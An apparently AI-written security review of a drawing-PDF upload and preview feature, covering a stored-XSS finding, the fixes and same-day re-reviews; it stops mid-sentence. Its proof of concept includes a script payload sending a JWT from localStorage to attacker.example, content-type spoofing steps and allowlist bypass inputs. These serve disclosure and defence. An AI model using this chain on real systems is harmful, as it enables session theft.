# Security Review — F-Drawing PDF Upload + Preview (T01)

- **Notion task:** T01 — PDF upload/preview + per-type versioning + blob-URL
  revoke bugfix (https://app.notion.com/p/3dbaa61b71f68193adbbf714706bbdcf)
- **Notion feature:** F-Drawing PDF Upload + Preview
  (https://app.notion.com/p/3dbaa61b71f6813c8e17d1b356c9bf0e)
- **Branch:** `dev-t-drawing-pdf-upload` (base `dev`) — changes UNCOMMITTED
  in the working tree at review time
- **Reviewer:** security subagent (review-only, OWASP API Top 10 2023
  baseline), via `/release-gate`
- **Date:** 2026-09-14
- **Verdict: BLOCK** (initial review)
- **Re-review verdict (2026-09-14, same day, post-fix): RESOLVED** — see
  "Fix Verification" section below. Both recommended fixes (backend
  allowlist + frontend `sandbox=""`) landed on `dev-t-drawing-pdf-upload`
  (uncommitted in the working tree at re-review time); independently
  re-verified against the actual diff and both new test files, not taken
  on the implementer's summary.
- **⚠️ Superseded same day — the `sandbox=""` half of that fix was reverted
  after live-browser testing** (Playwright/real Chrome) showed Chromium
  refuses to render any PDF inside a sandboxed iframe at all ("This page
  has been blocked by Chrome" — see Chromium bug 413851, cited but not yet
  confirmed live in the first re-review below). It was replaced with a
  different, stronger single-layer mitigation: force-retyping the fetched
  blob to `application/pdf` before `URL.createObjectURL()`. **Final verdict
  (2026-09-14, second same-day re-review): still RESOLVED** under the
  corrected mechanism — see "Second Correction — sandbox reverted,
  force-retype is the mitigation" at the end of this file. That section is
  authoritative for the current state of the code; the "Fix Verification"
  section below describing `sandbox=""` documents a fix that is **no
  longer present in the code** and should be read as history only.

---

## Scope reviewed

`git diff dev -- backend/src/modules/drawings/ src/api/drawings.ts
src/hooks/useDrawings.ts src/components/drawings/ src/pages/DrawingList.tsx`
(8 files) — `backend/src/modules/drawings/{drawings.controller.ts,
drawings.service.ts,drawings.service.spec.ts}`, new
`backend/src/modules/drawings/dto/latest-version-query.dto.ts`,
`src/api/drawings.ts`, `src/components/drawings/{DrawingPreviewPanel.tsx,
DrawingUploadModal.tsx}`, `src/hooks/useDrawings.ts`,
`src/pages/DrawingList.tsx`.

Also read (unchanged by this diff, load-bearing for the questions below):
`backend/src/modules/drawings/dto/{create-drawing.dto.ts,query-drawing.dto.ts}`,
`backend/src/main.ts` (global `ValidationPipe` config), `backend/src/modules/
file-storage/{file-storage.controller.ts,file-storage.service.ts,drivers/
{local.driver.ts,gcs.driver.ts}}`, `src/api/client.ts`, `src/context/
AuthContext.tsx`, `src/components/drawings/DrawingApsPreview.tsx`,
`vercel.json`, `index.html`, `docs/security/risk-register.md` (R-001,
R-007, R-011), `docs/security/findings/{2026-08-24-drawing-gcs-dxf.md,
2026-08-26-drawing-aps-preview.md}`.

---

## DoD checklist

| Check | Result |
|---|---|
| `JwtAuthGuard` on all endpoints | Unchanged — `DrawingsController` and `FileStorageController` both `@UseGuards(JwtAuthGuard)` at class level; the new `latest-version` query param doesn't touch the guard. |
| DTO validation on new input (`LatestVersionQueryDto.file_type`) | Confirmed enforced, not decorative — see "Checked, clean" #1 below. |
| Grep clean: `password\|secret\|key\|credential\|DATABASE_URL` | Clean — only `file_key`/`getUploadUrl`/etc. as legitimate field/method names, no literal secret values in the diff. |
| File upload: size + MIME + extension | ⚠️ Client-side only for the new `.pdf` format (mirrors the pre-existing `.dwg`-only gap already logged as F-002 in `2026-08-26-drawing-aps-preview.md`) — not re-flagged here as new (see "Confirmed not worsened" below). The finding below (F-001) is a *different* issue: it's not about what extension is accepted, it's about what the new preview code path *does* with the bytes once fetched. |
| No SQL string concat / `$queryRaw` | Clean — `getLatestVersion`'s new `file_name: { endsWith: \`.${fileType}\`, mode: 'insensitive' }` is a typed Prisma filter object, not `$queryRaw`/`$queryRawUnsafe`; Prisma compiles this to a parameterized query regardless of `fileType`'s value. |
| Audit trail for state changes | N/A — no new state-changing flow; `latest-version` is a read, and drawing creation is unchanged by this diff. |

---

## F-001 · HIGH · A03:2021 Injection (Stored XSS) / API8:2023 Security Misconfiguration — new PDF preview iframe renders attacker-controlled `Content-Type`, same-origin, unsandboxed → JWT theft

- **Where:**
  - `src/components/drawings/DrawingPreviewPanel.tsx` (new `isPdf()` branch, `<iframe src={`${pdfUrl}#navpanes=0`} ...>` — **no `sandbox` attribute**)
  - `src/hooks/useDrawings.ts` `useDrawingPdfUrl()` (new — `URL.createObjectURL(await fetchDrawingBlob(fileKey))`)
  - `src/api/drawings.ts` `fetchDrawingBlob()` (new — `apiClient.get('/file-storage/download', { responseType: 'blob' })`)
  - Contributing, pre-existing (not touched by this diff, but now reachable through a new sink): `backend/src/modules/file-storage/file-storage.controller.ts:32-39` (`presignedUpload` accepts client-supplied `contentType` with zero allowlist) and `backend/src/modules/drawings/dto/create-drawing.dto.ts` (`file_name`/`file_key` never cross-checked against the object's actual stored `Content-Type`)

- **What:** This PR adds the first code path in the app that renders
  fetched blob bytes **in-page** rather than forcing a download. Previously,
  `fetchDrawingBlob`'s only caller was `downloadDrawing()`, which does
  `a.download = fileName` — that only ever writes bytes to disk via the
  browser's Save-As mechanism; a spoofed `Content-Type` there is harmless
  because nothing executes it. This PR adds a second caller,
  `useDrawingPdfUrl()`, that instead does `URL.createObjectURL(blob)` and
  feeds the result straight into an `<iframe src=...>` with **no `sandbox`
  attribute** — i.e., the browser renders the blob live, using whatever
  `Content-Type` the fetch actually returned.

  The routing decision to use this new in-page-render path is made purely
  on `drawing.file_name`'s suffix (`isPdf()` in `DrawingPreviewPanel.tsx`),
  a client-supplied string that is never validated against the object's
  actual bytes or actual stored `Content-Type`:

  - `POST /file-storage/presigned-upload` (unchanged, pre-existing) accepts
    `{ key, contentType }` from the client with only a non-empty check —
    no allowlist. On the GCS driver (staging/prod), this `contentType` is
    what GCS serves back verbatim on every subsequent `download`.
  - `POST /drawings` (`CreateDrawingDto`, unchanged) accepts `file_name` as
    a free `@IsString()` — nothing requires it to match the real
    `Content-Type` of the object at `file_key`, or even to match the
    object's real extension.
  - Both endpoints require only `JwtAuthGuard` — **any** authenticated user
    (per the already-tracked `R-001`/`R-011` permission-ungated gap on this
    module, not re-flagged here as new, but it does mean this requires no
    elevated privilege) can reach both.

  Concrete PoC (no UI needed, plain authenticated API calls):
  1. `POST /api/v1/file-storage/presigned-upload` with
     `key: "drawings/<proj_code>/<zone_code>/v<n>/evil.pdf"`,
     `contentType: "text/html"`.
  2. `PUT` an HTML payload to the returned signed URL, e.g.
     `<script>fetch('https://attacker.example/x?c='+localStorage.getItem('bdt_token'))</script>`.
  3. `POST /api/v1/drawings` with a matching `file_key`, `file_name:
     "evil.pdf"`, plus a valid `project_id`/`zone_id`/`version`.
  4. Any other authenticated user who opens that zone's PDF tab in
     `DrawingList` and selects the planted row triggers
     `useDrawingPdfUrl(drawing.file_key)` → `fetchDrawingBlob()` returns a
     `Blob` whose `.type` is `text/html` (taken from the actual response
     `Content-Type` header — standard XHR/fetch Blob behavior, not
     something axios alters) → `URL.createObjectURL()` mints a `blob:` URL
     whose **origin is the app's own origin** (per the Blob URL spec, the
     origin is that of the document that created it, not an opaque/null
     origin) → the unsandboxed `<iframe>` renders it as a live, same-origin
     HTML document. The attacker's `<script>` executes with full access to
     that origin's `window`, including `localStorage` — confirmed
     (`src/api/client.ts:9`, `src/context/AuthContext.tsx:43`) that the JWT
     is stored at `localStorage['bdt_token']`. The script can exfiltrate it
     directly, or `top.location`-redirect for phishing, or otherwise act as
     that user.

  Verified no mitigation exists anywhere in the app: no CSP (`grep`'d
  `vercel.json` and `index.html` — no `Content-Security-Policy` header or
  meta tag anywhere), no `helmet` in the backend (`main.ts` sets CORS +
  compression + a global `ValidationPipe` only), and the local-driver path
  (`res.sendFile`) is no safer in principle — it derives `Content-Type`
  from the file's on-disk extension via `send`, which is *safer* than the
  GCS path here, but staging/prod run the GCS driver where the spoofed
  `Content-Type` set at upload time is what's served.

- **Why this is a new finding, not a restatement of prior reviews:** Two
  earlier reviews already touched `presigned-upload`'s missing
  `contentType` allowlist —
  `docs/security/findings/2026-08-24-drawing-gcs-dxf.md` F-01 (scored
  Medium, framed as an **arbitrary-overwrite/integrity** issue) and
  `docs/security/findings/2026-08-26-drawing-aps-preview.md` (logged only
  as an out-of-scope **Observation**, explicitly "not filed as a finding
  ... not part of the Drawing-APS-preview feature surface"). Neither could
  have flagged the *rendering* risk, because **no sink existed yet** that
  turned fetched blob bytes into live, in-page, same-origin content — every
  prior consumer forced a download. This PR is what creates that sink.
  Combined with the still-unfixed missing `contentType` allowlist, it
  upgrades a Medium/observational integrity gap into a High-severity,
  directly exploitable stored-XSS-to-session-theft chain. This is exactly
  the "new file-type/extension trust boundary" the review brief asked to
  check for — the upload DTO itself is unchanged, but the **preview
  routing is security-relevant**, contrary to how it might look at a
  glance: it decides whether fetched bytes are downloaded (safe) or
  executed in-page (not safe without further controls).

- **Impact:** Full session takeover (JWT theft) of any user who previews a
  planted file, or DOM-based phishing via `top.location` redirect. Given
  the role card's domain note that JWT dev-mode is currently
  "production-ready" (`NODE_ENV` guard removed) and BDT holds engineering
  IP (BOM data, shop drawings, customer master), this is a real-impact
  finding, not theoretical.

- **Likelihood:** Medium — requires an authenticated account (internal SSI
  Steel users only, single-tenant, per existing risk-register framing) and
  a target user opening the specific planted file's preview. Not
  pre-auth-reachable, but any authenticated user can plant it for any other
  authenticated user, and "please check this drawing" is a low-friction
  social-engineering ask in this workflow.

- **Fix route (both, independent defenses — recommend both, either alone closes the concrete PoC above):**
  - **frontend** — add `sandbox=""` (no tokens: no `allow-scripts`, no
    `allow-same-origin`) to the preview `<iframe>` in
    `DrawingPreviewPanel.tsx`. This forces any content rendered there —
    PDF or otherwise — into a unique opaque origin with scripts disabled,
    closing the exploit even if the backend allowlist below is skipped or
    incomplete. Verify in QA that Chrome/Edge/Firefox's native PDF
    rendering still works fully sandboxed (expected: yes — PDF viewer
    chrome doesn't depend on the framed document's own script execution
    for basic viewing); if a specific PDF-viewer feature turns out to need
    `allow-scripts`, add only that token, **never** `allow-same-origin`
    together with `allow-scripts` on this element (that combination lets a
    sandboxed document remove its own sandbox restrictions).
  - **backend** — validate `contentType` in
    `FileStorageController.presignedUpload()` against an explicit
    allowlist for the module's known real use (e.g. `application/pdf`,
    `image/vnd.dwg` / `application/octet-stream` for `.dwg`, generic
    `application/octet-stream` fallback) instead of accepting any
    client-supplied string verbatim. This is the same class of gap already
    tracked as `R-007` for a different upload path
    (`machines.controller.ts`'s extension check) — recommend generalizing
    that fix pattern to `file-storage.controller.ts` rather than
    special-casing drawings. This also finally resolves the two prior
    reviews' Medium/observational notes on this same endpoint.
  - Both fixes are additive/config-shaped — neither requires touching this
    PR's actual feature logic (per-type versioning, `LatestVersionQueryDto`,
    upload modal), so this should not require redesigning the shipped
    feature, just hardening the two files above before merge.

- **Severity: High → BLOCK** per `/release-gate`'s severity table
  ("missing JWT guard / DTO validation absent / file upload missing
  checks" = High = BLOCK — this is the rendering-side analogue: a missing
  content-type/sandbox control on a newly-added render sink for
  user-supplied files).

---

## Checked, clean (no finding)

### 1. `file_type` query param validation is real, not decorative

`LatestVersionQueryDto.file_type` (`backend/src/modules/drawings/dto/
latest-version-query.dto.ts:6-8`) is `@IsIn(['dwg', 'pdf'])`, no
`@IsOptional()`. Confirmed this is actually enforced end-to-end, not just a
class-validator decorator sitting unused:

- `backend/src/main.ts:17` registers a **global**
  `app.useGlobalPipes(new ValidationPipe({ whitelist: true,
  forbidNonWhitelisted: false, transform: true }))` — every controller,
  including `DrawingsController`, runs every incoming DTO through this pipe
  before the handler executes. An invalid or missing `file_type` throws a
  400 automatically; the handler body (and therefore `DrawingsService.
  getLatestVersion()` and the Prisma call) is never reached.
- The diff's own new test block (`drawings.service.spec.ts`, `describe
  ('LatestVersionQueryDto validation')`) independently exercises this via
  `plainToInstance` + `validate()` directly against the DTO class (not just
  through the service) — asserts `'dwg'`/`'pdf'` pass, a missing value
  fails, and an unrecognized value (`'dxf'`) fails. Ran these assertions
  through by inspection against `class-validator`'s documented `@IsIn`
  behavior — consistent.
- Even setting validation aside as a hypothetical: `getLatestVersion()`
  only ever uses `fileType` inside a typed Prisma filter object
  (`file_name: { endsWith: \`.${fileType}\`, mode: 'insensitive' }`), never
  in `$queryRaw`/`$queryRawUnsafe` or any string-built SQL — so even an
  unvalidated arbitrary string could not become a SQL/NoSQL injection
  vector here, only (at worst) an unexpected-but-harmless `endsWith` value.
  The enum constraint is correct and worth keeping regardless, but it is
  not standing between user input and a raw query.

### 2. Upload path (`CreateDrawingDto`, `file_key` regex) — confirmed unchanged, and the one place a new extension-based trust decision *was* introduced is F-001 above, not here

`git diff dev -- backend/src/modules/drawings/dto/create-drawing.dto.ts`
is empty — confirmed byte-for-byte unchanged. The regex
(`/^drawings\/[^/\\]+\/[^/\\]+\/(?:[^/\\]+\/)?v\d+\/[^/\\]+$/`) still only
constrains path *shape*, never extension — same pre-existing,
already-documented gap as `2026-08-26-drawing-aps-preview.md` F-002 (Low,
not re-scored here, not worsened by this diff). Traced every place
`file_name`'s extension is read in the diff:

- `DrawingsService.create()` (unchanged) — `.endsWith('.dwg')` gates
  whether the fire-and-forget APS push fires. Not security-relevant: at
  worst a mismatched extension wastes an APS push attempt or skips one;
  no code executes based on this check.
- `DrawingPreviewPanel.tsx`'s new `isPdf()` — **this is the one
  security-relevant use**, and it's covered by F-001 above, not a second
  finding here.
- `DrawingList.tsx`'s new `filterDrawingsByType()` — pure client-side list
  filtering (which rows show under the DWG/PDF toggle); doesn't gate any
  fetch, render, or trust decision, so this one is correctly
  non-security-relevant UI routing.

### 3. Pre-existing gaps confirmed not worsened by this PR

- **R-001/R-011 (BOLA, drawings endpoints permission-ungated by design):**
  `getLatestVersion` (and every other drawings endpoint) still has zero
  object/project-scope check after this diff — same as before. The new
  `file_type` param adds a filter dimension, not an authorization
  dimension; it neither improves nor worsens this gap. Not re-flagged as a
  new finding, per the review brief. (It *is* cited above as context for
  F-001's likelihood — the ungated module is what lets "any authenticated
  user" plant the payload — but that framing doesn't change R-001/R-011's
  own tracked status.)
- **`file_key`'s traversal guard covers `/`/`\` but not literal `..`
  segments:** `CreateDrawingDto.file_key`'s regex is confirmed byte-for-byte
  unchanged (see #2 above) — this PR touches none of the traversal-guard
  logic. Unchanged, not re-flagged, per the review brief.

---

## Risk register update

Appending a new entry — F-001 above is a genuinely new risk class (stored
XSS / session-token theft via content-type confusion in a file-preview
sink), distinct from every existing `R-###` entry (none of which are about
XSS or about rendering user-supplied file content in-page):

**R-012 · A03:2021 Injection (Stored XSS) — file-preview iframes trust
fetched `Content-Type` with no sandbox, and upstream `Content-Type` is
client-supplied with no allowlist**

- **OWASP:** A03:2021 (Injection, XSS) / API8:2023 (Security
  Misconfiguration)
- **Impact:** High — same-origin script execution in a context where the
  JWT is stored in `localStorage`; realistic path to full session/account
  takeover of any user who opens a planted preview.
- **Likelihood:** Medium — requires an authenticated account (internal
  users only) to plant the payload, and a target user to open that specific
  file's preview.
- **Owner:** frontend (iframe `sandbox` attribute) + backend
  (`presigned-upload` content-type allowlist)
- **Fix path:** see F-001's "Fix route" above — `sandbox=""` on
  `DrawingPreviewPanel.tsx`'s preview `<iframe>`, plus an explicit
  `contentType` allowlist in `FileStorageController.presignedUpload()`
  (generalize `R-007`'s fix pattern to this endpoint). Any future feature
  that renders a fetched blob in-page (not just downloads it) should be
  reviewed against this same register entry before shipping.
- **Status:** Open
- **Created:** 2026-09-14 (F-Drawing PDF Upload + Preview review, T01)
- **Finding ref:** `docs/security/findings/2026-09-14-drawing-pdf-upload.md` F-001
- **Related, not superseded:** `docs/security/findings/
  2026-08-24-drawing-gcs-dxf.md` F-01 (same root cause — missing
  `contentType` allowlist — different consequence: that entry is about
  unauthorized overwrite/integrity, this one is about rendering the
  attacker-chosen `Content-Type` in-page). Fixing the allowlist recommended
  here would also close that entry's root cause, though F-01's own overwrite
  concern is broader (arbitrary key, not just arbitrary content-type) and
  would need its own key-prefix check to fully close.

---

## Files reviewed

`backend/src/modules/drawings/{drawings.controller.ts,drawings.service.ts,
drawings.service.spec.ts,dto/{create-drawing.dto.ts,query-drawing.dto.ts,
latest-version-query.dto.ts}}` · `backend/src/main.ts` ·
`backend/src/modules/file-storage/{file-storage.controller.ts,
file-storage.service.ts,drivers/{local.driver.ts,gcs.driver.ts}}` ·
`src/api/{drawings.ts,client.ts}` · `src/context/AuthContext.tsx` ·
`src/hooks/useDrawings.ts` · `src/components/drawings/
{DrawingPreviewPanel.tsx,DrawingUploadModal.tsx,DrawingApsPreview.tsx}` ·
`src/pages/DrawingList.tsx` · `vercel.json` · `index.html` ·
`docs/security/risk-register.md` · `docs/security/findings/
{2026-08-24-drawing-gcs-dxf.md,2026-08-26-drawing-aps-preview.md}`.

## Status

DONE (initial pass). Reported **BLOCK** to `/release-gate` — one High
finding (F-001). Route: frontend (`sandbox` attribute) + backend
(`presigned-upload` content-type allowlist), both additive/config-shaped,
neither requires touching this PR's actual per-type-versioning feature
logic.

---

## Fix Verification (2026-09-14, post-fix re-review)

Both fixes recommended above have been applied on the same branch
(`dev-t-drawing-pdf-upload`), still uncommitted in the working tree at
re-review time. Re-verified independently against the actual diff and by
running the new tests myself — not taken on trust from a summary.

**Diff reviewed:** `git diff dev -- backend/src/modules/file-storage/
src/components/drawings/DrawingPreviewPanel.tsx`.

### 1. Backend — `FileStorageController.presignedUpload()` content-type allowlist

`backend/src/modules/file-storage/file-storage.controller.ts:25,49-51` now
rejects any `contentType` not exactly `application/pdf` or
`application/octet-stream` with a `BadRequestException`, thrown **before**
`this.svc.getUploadUrl()` is called — the spoofed value never reaches
`GcsFileStorageDriver.getUploadUrl()` (`drivers/gcs.driver.ts:21-29`),
which is what sets the object's stored `Content-Type` metadata (via the v4
signed URL's `contentType` field) and is what GCS serves back verbatim on
every subsequent download (`getDownloadUrl`, `drivers/gcs.driver.ts:31-38`,
generates a plain read-signed URL with no response-content-type override —
confirmed there is no second place a client-supplied content-type can
reach the stored object).

**Bypass analysis (the specific vectors the review brief asked to check):**

- **Case sensitivity** — `ALLOWED_UPLOAD_CONTENT_TYPES.includes(body.contentType)`
  is a plain array `.includes()`, i.e. strict `===` per element. No
  case-folding is done anywhere. `'Application/PDF'` or `'APPLICATION/PDF'`
  is simply **not equal** to `'application/pdf'` and is rejected — fails
  closed, not a bypass. (It would only matter as a *functional* bug if a
  legitimate caller ever sent non-lowercase; confirmed it doesn't — see
  below.)
- **Whitespace** — same reasoning: `' application/pdf'`, `'application/pdf '`,
  or embedded whitespace/control chars are not string-identical to the
  allowlisted literals and are rejected. No `.trim()` anywhere in the
  request path that could normalize an attacker-supplied value into a match
  it shouldn't have.
- **Charset/parameter suffixes** — `'application/pdf; charset=binary'` is
  not string-identical to `'application/pdf'` and is rejected. There's no
  `startsWith()`/`split(';')`/regex parsing of the media type anywhere in
  this path that a suffix could exploit — the check is exact-match against
  a 2-item literal array, which is the strictest possible implementation
  for a fixed allowlist (no substring/prefix logic to abuse).
- **Type confusion** — there's no DTO/class-validator on this endpoint (the
  handler param is a bare `{ key: string; contentType: string }` type
  annotation, erased at runtime, so Nest's global `ValidationPipe` skips it
  — `metatype === Object`). This means `body.contentType` could arrive as
  any JSON type (array, number, object, `null`). `Array.includes()` against
  non-string values just returns `false` for every element → rejected.
  Fails closed.
- **JSON duplicate-key smuggling** — `{"contentType":"application/pdf","contentType":"text/html"}`
  parses to a single object where `body-parser`'s `JSON.parse` keeps the
  *last* key; the allowlist check and the value forwarded to
  `getUploadUrl()` both read the same already-parsed `body.contentType` —
  no TOCTOU gap between what's checked and what's stored.
- **Net result: no bypass found.** The only two values that can ever reach
  GCS as stored `Content-Type` metadata via this endpoint are the literal
  strings `application/pdf` and `application/octet-stream`.

**Residual reasoning — are those two allowed values themselves safe, even
for mismatched/malicious bytes?** Content and declared type are still
independent (nothing validates that a file claiming `application/pdf`
actually parses as one) — but this no longer matters for the XSS chain
in F-001:
  - `application/octet-stream` is not a browser-renderable/executable type;
    navigating a frame to a blob of this type triggers a download action
    (or is silently blocked in a sub-frame context), never HTML/script
    execution.
  - `application/pdf` routes to the browser's native PDF parser (PDFium /
    pdf.js), which either renders the document or shows its own "failed to
    load" error UI on malformed bytes — it does not fall back to
    interpreting non-conforming bytes as HTML. Confirmed this is standard,
    long-established browser architecture, not something that needed
    live-testing here.
  - Neither allowed value can be coerced by the browser into same-origin
    script execution. **The concrete stored-XSS PoC in F-001 (spoofed
    `text/html`/`image/svg+xml` → same-origin script → JWT theft) is fully
    closed by this fix alone**, independent of the frontend change below.

**Scope note (not a new gap, not re-flagged):** this allowlist only covers
`presignedUpload()` (the GCS direct-upload path, which is what
staging/prod and the frontend's actual upload flow use —
confirmed `src/api/drawings.ts` only ever calls `getPresignedUpload(key,
file.type || 'application/octet-stream')`, matching the allowlist exactly,
no functional regression). The local-driver multipart endpoint
(`POST /file-storage/upload`) is untouched — its download path derives
`Content-Type` from the `key`'s on-disk extension via `send`, not from any
client-supplied `contentType`, so extension-based spoofing there is a
structurally different (and already, in the original finding, explicitly
deprioritized as non-production) gap. Not part of F-001's scope; not
re-opening it here.

**Tests:** ran `cd backend && npx jest
src/modules/file-storage/file-storage.controller.spec.ts` myself —
5/5 pass (accept-pdf, accept-octet-stream, reject-text/html,
reject-image/svg+xml, required-fields). Assertions match the allowlist's
actual behavior, not just its presence.

### 2. Frontend — `sandbox=""` on the preview `<iframe>`

`src/components/drawings/DrawingPreviewPanel.tsx` — confirmed the iframe
carries `sandbox=""` (empty string, zero tokens), not merely a `sandbox`
attribute with `allow-scripts`/`allow-same-origin` tokens that would
undermine it. An empty `sandbox` value is per-spec the maximally-restrictive
form: scripts disabled, forms disabled, popups disabled, top-level
navigation disabled, plugins disabled, and the framed content is forced to
a unique opaque origin regardless of what its actual origin would
otherwise be. This holds **unconditionally for whatever content type ends
up in the frame** — it is not contingent on the backend allowlist being
correct, which is exactly the "defense in depth" the original finding
asked for.

**Researched (per review brief, not guessed): does `sandbox=""` actually
still let the PDF render, or does it silently break the feature?** This
needed checking because the fix's own code comment assumed "yes." Web
research surfaced a well-documented, long-standing (2014→present, still
open/unconfirmed in Chromium's own tracker as issue 413851, and recurring
in current projects — e.g. `bulwarkmail/webmail#253`, `open-webui#17044`,
`FSM1/cipher-box#1780`) cross-browser interoperability gap: **Chromium
family browsers (Chrome, Edge, Brave) do not run their built-in PDF viewer
inside a sandboxed iframe at all** — the native viewer is implemented as
what the sandboxing model still treats as a "plugin," and the current HTML
sandbox spec has no `allow-plugins` token to re-enable it (that token
existed only in the old NPAPI era). The observed failure mode is a blank
frame (Chromium) or a block page (Brave), not an error the app's own
`pdfError`/`pdfLoading` states would catch — `useDrawingPdfUrl()`'s query
succeeds (the blob fetch itself works fine), so the component renders the
`<iframe>` believing it will show content; whether it visually renders is
entirely up to the browser's internal plugin-sandboxing rule, which this
test suite (jsdom, no real PDF engine) cannot exercise. Firefox's pdf.js
(JS-based, not a native plugin) is reported as "less bad" but still
inconsistent under sandboxing per the same sources.

**This is a functional-regression risk, not a security gap** — if
anything it demonstrates the sandbox is doing exactly what it's supposed
to (blocking active/plugin content unconditionally). But it is a real risk
to the *feature actually shipping working*, and indirectly a risk to the
security fix's durability: if QA finds PDFs render blank in Chrome/Edge —
SSI Steel's likely primary browsers — the natural "fix" is to loosen
`sandbox` (e.g. add `allow-scripts`, or worse `allow-scripts
allow-same-origin` together), which would **reopen this exact XSS class**.
Flagging this explicitly so it doesn't get "fixed" that way:
  - **Do not** add `allow-same-origin` together with `allow-scripts` to
    this iframe under any circumstance — that combination lets sandboxed
    content strip its own sandbox.
  - If blank rendering is confirmed in QA, the correct fix is routed to
    **frontend**, not a sandbox loosen: render PDFs via a bundled,
    JS-based viewer (e.g. pdf.js as a library dependency) that runs *as
    the page's own script*, inside the sandboxed iframe or even without an
    iframe at all — not by depending on the browser's native/plugin
    viewer, which is what triggers this interop limitation.
  - Recommend `/release-gate`'s QA pass (or a manual smoke test) actually
    open a `.pdf` drawing in Chrome before this ships, given the above is
    a known, reproducible, cross-browser issue, not a hypothetical.

**Tests:** ran `npx vitest run
src/components/drawings/DrawingPreviewPanel.test.tsx` myself — 7/7 pass,
including the two F-001-relevant assertions (`sandbox` attribute is
exactly `""`, and the APS/iframe code paths route correctly by file type).
Note this test suite runs in jsdom and, as above, cannot detect the
native-PDF-viewer-in-sandboxed-iframe rendering question — that gap is
inherent to jsdom, not a hole in this test file.

### Verdict

**F-001: RESOLVED.** The concrete stored-XSS PoC (spoofed `Content-Type` →
same-origin HTML/script render → `localStorage` JWT theft) is closed by
the backend allowlist alone — verified via diff review, bypass analysis
(case/whitespace/charset/type-confusion/duplicate-key — none found
exploitable), and passing tests. The frontend `sandbox=""` is a
genuine second independent layer (unconditional, not contingent on the
allowlist), correctly implemented with no token weakening. No new gap was
found that reopens the original XSS chain.

**One open follow-up, not blocking this verdict:** confirm in real-browser
QA (not just the jsdom test) that the PDF preview actually renders in
Chrome/Edge given the sandboxed-iframe-vs-native-PDF-viewer interop issue
documented above — route to **qa** (and **frontend** if it turns out
broken) as a functional item, explicitly **not** as a reason to loosen the
`sandbox` attribute.

Risk register `R-012` updated accordingly (see
`docs/security/risk-register.md`).

---

## Second Correction — sandbox reverted, force-retype is the mitigation (2026-09-14, same day, third pass)

The "open follow-up" flagged directly above — confirm in real-browser QA
that the PDF preview actually renders in Chrome — was run (Playwright,
real Chrome), and it failed exactly as the interop research predicted:
every `.pdf` preview showed **"This page has been blocked by Chrome"**,
not a rendered document. This is not a config mistake to fix; it's the
same unconditional Chromium limitation documented above (Chromium bug
413851, open since 2014, re-confirmed by web research during this pass —
see Sources below): the native PDF viewer is implemented as a "plugin"
internally, `sandbox` unconditionally disables plugins, and no token in
the current HTML sandbox spec re-enables them (`allow-plugins` was
proposed in the NPAPI era and never adopted). **There is no sandbox token
combination that keeps the native PDF viewer working** — this was
researched fresh for this pass, not assumed, and confirms the original
finding's own prediction ("if a specific PDF-viewer feature turns out to
need `allow-scripts`... never `allow-same-origin` together" — the actual
failure mode turned out to be total, not partial, so that fallback token
question is moot).

**The fix, as it now stands on `dev-t-drawing-pdf-upload`:**

1. **Backend allowlist — unchanged.**
   `backend/src/modules/file-storage/file-storage.controller.ts:25,49-51`
   still rejects any `contentType` other than `application/pdf` or
   `application/octet-stream`. Re-confirmed via `git diff dev --
   backend/src/modules/file-storage/` — identical to what the first
   re-review verified; not re-litigated here. `cd backend && npx jest
   src/modules/file-storage/file-storage.controller.spec.ts` — 5/5 pass.

2. **`sandbox=""` removed** from the iframe in
   `src/components/drawings/DrawingPreviewPanel.tsx`. Confirmed via `git
   diff dev -- src/components/drawings/DrawingPreviewPanel.tsx`: the
   element is now a plain `<iframe src={...} title={...} style={...}>`
   with no `sandbox` attribute at all, plus a code comment explaining why
   (cites the live "blocked by Chrome" result and Chromium bug 413851) and
   explicitly pointing at the hook-level fix as the real mitigation.

3. **`src/hooks/useDrawings.ts`'s `useDrawingPdfUrl()` now force-retypes
   the fetched blob** before minting the object URL:
   ```ts
   const blob = await fetchDrawingBlob(fileKey!)
   return URL.createObjectURL(new Blob([blob], { type: 'application/pdf' }))
   ```
   instead of passing the fetched blob (and its server-declared `.type`)
   through unchanged. This hook is only ever invoked for a `file_key` that
   `DrawingPreviewPanel`'s `isPdf()` check has already routed as a PDF.

### Re-analysis of the exploit chain against this specific mechanism

The question this pass exists to answer: with `sandbox=""` gone, does
`new Blob([blob], { type: 'application/pdf' })` genuinely prevent the
browser from ever treating the resulting `blob:` URL as executable
HTML/script — regardless of the original blob's `.type` or the actual
byte content — or does the original type/content leak through some other
channel (sniffing, `Content-Disposition`, etc.)? Traced each sub-question
independently rather than taking the code comment's claim at face value:

- **Does the Blob constructor's `type` option override how the resulting
  object URL is served/interpreted?** Yes, unconditionally, by spec (File
  API §4, `Blob()` constructor + Blob URL Store). `new Blob([blob],
  {type})` reads `blob`'s bytes (a `Blob` is a valid `BlobPart`) into a
  **new** Blob object whose `.type` is set solely from `options.type` —
  the source blob's own `.type` is not consulted at all for the new
  object's type. When `URL.createObjectURL()` is later called on *that*
  new Blob, the browser's "fetching a blob URL" algorithm constructs its
  response using **that Blob object's own stored `type` and bytes** — a
  `blob:` URL's response is synthesized entirely from the JS-side Blob
  object at fetch time; nothing about how the bytes were originally
  obtained (an HTTP response, another Blob, a `File`, etc.) survives into
  that synthesized response except what got copied into the Blob's own
  fields. So yes — this constructor pattern fully and structurally
  overrides what the browser will report as this resource's Content-Type
  for every purpose (sniffing input, MIME-type-based dispatch, etc.).

- **Does the original blob's `.type` leak through some other channel?**
  No live channel found. `fetchDrawingBlob()` (`src/api/drawings.ts`) gets
  the original blob via `apiClient.get(..., { responseType: 'blob' })` —
  axios/XHR sets that Blob's `.type` from the actual HTTP response's
  `Content-Type` header. But that blob is only ever used as a *bytes
  source* for `new Blob([blob], {type: 'application/pdf'})` — its `.type`
  field is read nowhere in this code path. It isn't stored, isn't
  compared, isn't passed to `createObjectURL` directly. There's no second
  object URL created for the original blob anywhere in this hook.

- **Does `Content-Disposition` (or any other original-response header)
  leak through?** No — structurally can't. A `Blob` object has exactly two
  relevant fields, `size` and `type`; it carries no header bag. Whatever
  `Content-Disposition` (or anything else) the original `/file-storage/
  download` response (or, on the `gcs` driver, the redirect target GCS
  itself serves) carried is discarded the moment axios turns the response
  into a `Blob` — it was never captured into the Blob object in the first
  place, so there is nothing left to leak once that Blob is rewrapped.
  This is a structural difference from the `sandbox=""` layer being
  removed: that layer would have been enforced by the browser at *render*
  time, request-attribute-driven, and could in principle be undermined by
  a future code change adding a token; force-retype is enforced by
  *what object gets constructed*, upstream of any render/serve step, and
  is undermined only by someone deleting the `new Blob([...], {type})`
